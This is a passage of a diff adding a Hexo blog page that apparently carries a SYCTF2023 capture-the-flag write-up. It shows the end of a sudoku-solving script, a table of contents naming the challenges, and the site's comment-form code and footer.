class="line">| 4 0 1 | 0 0 8 | 0 3 0 | </span><br><span class="line">| 0 8 3 | 5 0 0 | 0 4 7 | </span><br><span class="line">| 0 0 9 | 6 0 0 | 4 0 3 | </span><br><span class="line">| 0 0 4 | 9 8 0 | 7 2 0 | </span><br><span class="line">| 7 3 0 | 4 0 2 | 9 0 0 | </span><br><span class="line">| 0 0 5 | 0 0 6 | 2 9 0 | </span><br><span class="line">| 0 4 2 | 0 0 0 | 6 0 0 | </span><br><span class="line">| 0 0 8 | 2 0 5 | 0 7 0 |&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">    sudo = strToArray(s)</span><br><span class="line">    question = copy.deepcopy(sudo)</span><br><span class="line">    answer = sudoku(sudo)</span><br><span class="line">    getTrack(question,answer)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/SYCTF2023/image-20230610132750172.png" alt="image-20230610132750172.png"></p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/SYCTF2023/image-20230610132955026.png" alt="image-20230610132955026.png"></p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/SYCTF2023/image-20230610133030711.png" alt="image-20230610133030711.png"></p>
+
+    </div>
+    
+    <div class="toc-container">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CarelessPy"><span class="toc-text">CarelessPy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Confronting-robot"><span class="toc-text">Confronting robot</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-text">复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%80%83"><span class="toc-text">思考</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E5%8F%B7%E7%9A%84%E7%BD%97%E7%BA%B3%E5%B0%94%E5%A4%9A"><span class="toc-text">4号的罗纳尔多</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sleepwalker"><span class="toc-text">sleepwalker</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-text">修改字节码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSTI%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">SSTI内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%A6%E4%B8%80%E6%9D%A1%E9%93%BE"><span class="toc-text">另一条链</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#misc"><span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sudoku-easy"><span class="toc-text">sudoku_easy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%83%A6%E4%BA%BA%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="toc-text">烦人的压缩包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudoku-speedrun"><span class="toc-text">sudoku_speedrun</span></a></li></ol></li></ol>
+    </div>
+
+    
+        <div id="custom-comments" class="custom-comments">
+    <h3>Comments</h3>
+    <form id="comment-form" class="comment-form">
+        <div class="form-row">
+            <input type="text" id="c-nickname" placeholder="Nickname *" required>
+            <input type="email" id="c-email" placeholder="Email">
+            <input type="url" id="c-website" placeholder="Website">
+        </div>
+        <textarea id="c-content" placeholder="Leave a comment..." required></textarea>
+        <button type="submit" id="c-submit">Submit</button>
+    </form>
+    <div id="comment-list" class="comment-list">
+        <!-- Comments will be loaded here -->
+        <p class="loading">Loading comments...</p>
+    </div>
+</div>
+
+<style>
+    .custom-comments {
+        margin-top: 40px;
+        border-top: 1px solid #eee;
+        padding-top: 20px;
+    }
+    .comment-form {
+        margin-bottom: 30px;
+    }
+    .comment-form .form-row {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 10px;
+    }
+    .comment-form input, .comment-form textarea {
+        width: 100%;
+        padding: 8px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        background: #f9f9f9;
+    }
+    .comment-form textarea {
+        height: 100px;
+        resize: vertical;
+        margin-bottom: 10px;
+    }
+    .comment-form button {
+        padding: 8px 20px;
+        background: #333;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+    }
+    .comment-form button:hover {
+        background: #555;
+    }
+    .comment-item {
+        margin-bottom: 20px;
+        border-bottom: 1px solid #f0f0f0;
+        padding-bottom: 15px;
+    }
+    .comment-header {
+        margin-bottom: 5px;
+        font-size: 0.9em;
+        color: #666;
+    }
+    .comment-author {
+        font-weight: bold;
+        color: #333;
+        margin-right: 10px;
+    }
+    .comment-date {
+        font-size: 0.8em;
+        color: #999;
+    }
+    .comment-content {
+        line-height: 1.6;
+        color: #333;
+    }
+</style>
+
+<script>
+(function() {
+    const apiUrl = 'https://unk-blo-backend-rduuehbram.cn-shenzhen.fcapp.run';
+    const postUrl = window.location.pathname;
+    const commentList = document.getElementById('comment-list');
+    const commentForm = document.getElementById('comment-form');
+    const submitBtn = document.getElementById('c-submit');
+
+    function formatDate(timestamp) {
+        return new Date(timestamp).toLocaleString();
+    }
+
+    function escapeHtml(text) {
+        if (!text) return '';
+        return text
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;")
+            .replace(/'/g, "&#039;");
+    }
+
+    // Load comments
+    fetch(`${apiUrl}/api/comments?url=${encodeURIComponent(postUrl)}`)
+        .then(response => response.json())
+        .then(data => {
+            commentList.innerHTML = '';
+            if (data.comments && data.comments.length > 0) {
+                data.comments.forEach(comment => {
+                    const div = document.createElement('div');
+                    div.className = 'comment-item';
+                    
+                    let authorHtml = `<span class="comment-author">${escapeHtml(comment.nickname)}</span>`;
+                    if (comment.website) {
+                        authorHtml = `<a href="${escapeHtml(comment.website)}" target="_blank" class="comment-author">${escapeHtml(comment.nickname)}</a>`;
+                    }
+
+                    div.innerHTML = `
+                        <div class="comment-header">
+                            ${authorHtml}
+                            <span class="comment-date">${formatDate(comment.timestamp)}</span>
+                        </div>
+                        <div class="comment-content">${escapeHtml(comment.content)}</div>
+                    `;
+                    commentList.appendChild(div);
+                });
+            } else {
+                commentList.innerHTML = '<p>No comments yet. Be the first!</p>';
+            }
+        })
+        .catch(err => {
+            console.error('Error loading comments:', err);
+            commentList.innerHTML = '<p>Error loading comments.</p>';
+        });
+
+    // Submit comment
+    commentForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const nickname = document.getElementById('c-nickname').value;
+        const email = document.getElementById('c-email').value;
+        const website = document.getElementById('c-website').value;
+        const content = document.getElementById('c-content').value;
+
+        submitBtn.disabled = true;
+        submitBtn.innerText = 'Submitting...';
+
+        fetch(`${apiUrl}/api/comment`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                post_url: postUrl,
+                nickname: nickname,
+                email: email,
+                website: website,
+                content: content
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.message) {
+                // Add new comment to list immediately
+                const div = document.createElement('div');
+                div.className = 'comment-item';
+                div.innerHTML = `
+                    <div class="comment-header">
+                        <span class="comment-author">${escapeHtml(nickname)}</span>
+                        <span class="comment-date">Just now</span>
+                    </div>
+                    <div class="comment-content">${escapeHtml(content)}</div>
+                `;
+                
+                // Insert at the beginning or append if empty
+                if (commentList.querySelector('.comment-item')) {
+                    commentList.insertBefore(div, commentList.firstChild);
+                } else {
+                    commentList.innerHTML = '';
+                    commentList.appendChild(div);
+                }
+                
+                commentForm.reset();
+            } else {
+                alert('Error: ' + (data.error || 'Unknown error'));
+            }
+        })
+        .catch(err => {
+            console.error('Error submitting comment:', err);
+            alert('Error submitting comment');
+        })
+        .finally(() => {
+            submitBtn.disabled = false;
+            submitBtn.innerText = 'Submit';
+        });
+    });
+})();
+</script>
+
+    
+
+
+</div>
+<script>
+    window.onload = ()=>{
+
+        document.title = document.querySelector('.post-title p').innerText;
+
+        var zoomImgs = function() {
+            const images = document.querySelectorAll('.post-content img'); // Only select images in post content
+            images.forEach(img => {
+                img.style.width = '70%'
+                img.style.height = 'auto'
+            });
+        }
+
+        zoomImgs()
+    }
+    
+</script>
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<input type="hidden" id="valine_appid" value="diYBpeShV6s47KsfNez5JmBU-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="u3BEDbLDNridDApcAzJBWc9N">
+<input type="hidden" id="valine_enable" value="false">
+<input type="hidden" id="valine_placeholder" value="留下你的评论吧...">
+<input type="hidden" id="valine_avatar" value="hide">
+
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/js/lightbox.js"></script>
+
+
+
+<script>
+
+    var valine_appid = $("#valine_appid").val();
+    var valine_appKey = $("#valine_appKey").val();
+    var valine_enable = $("#valine_enable").val();
+    var valine_placeholder = $("#valine_placeholder").val();
+    var valine_avatar = $("#valine_avatar").val();
+
+    if(valine_enable == 'true'){
+        // Valine initialization code only if enabled
+        if (typeof Valine !== 'undefined') {
+            new Valine({
+                el: '#vcomments',
+                appId: valine_appid,
+                appKey: valine_appKey,
+                placeholder: valine_placeholder,
+                avatar: valine_avatar,
+            })
+        }
+    }
+
+</script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
